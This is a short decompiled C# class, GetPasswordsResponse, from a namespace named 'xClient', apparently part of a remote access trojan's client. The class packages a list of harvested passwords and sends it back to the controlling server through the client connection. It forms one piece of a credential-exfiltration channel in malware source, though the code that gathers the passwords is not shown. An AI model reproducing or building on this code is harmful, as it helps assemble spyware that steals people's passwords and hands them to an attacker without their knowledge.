using System;
using System.Collections.Generic;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000041 RID: 65
	[Serializable]
	public class GetPasswordsResponse : IPacket
	{
		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060001BB RID: 443 RVA: 0x00002D0D File Offset: 0x00000F0D
		// (set) Token: 0x060001BC RID: 444 RVA: 0x00002D15 File Offset: 0x00000F15
		public List<string> Passwords { get; set; }

		// Token: 0x060001BD RID: 445 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetPasswordsResponse()
		{
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00002D1E File Offset: 0x00000F1E
		public GetPasswordsResponse(List<string> data)
		{
			this.Passwords = data;
		}

		// Token: 0x060001BF RID: 447 RVA: 0x00002D2D File Offset: 0x00000F2D
		public void Execute(Client client)
		{
			client.Send<GetPasswordsResponse>(this);
		}
	}
}
